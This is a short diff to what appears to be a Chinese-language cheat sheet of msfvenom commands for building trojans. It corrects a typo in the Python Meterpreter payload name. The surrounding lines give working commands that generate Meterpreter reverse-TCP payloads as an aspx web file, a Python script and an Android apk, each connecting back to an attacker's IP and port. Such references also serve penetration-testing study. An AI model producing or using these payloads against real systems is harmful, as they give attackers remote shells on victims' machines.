@@ -31,7 +31,7 @@ lport  后跟监听的端口
       msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f aspx > hello.aspx
       
       #Python木马:
-      msfvenom -p python/meterpreter/reverser_tcp LHOST=<Your IP> LPORT=<Your Port> -f  raw > hello.py
+      msfvenom -p python/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f  raw > hello.py
       
       #Android木马:
       msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -o hello.apk
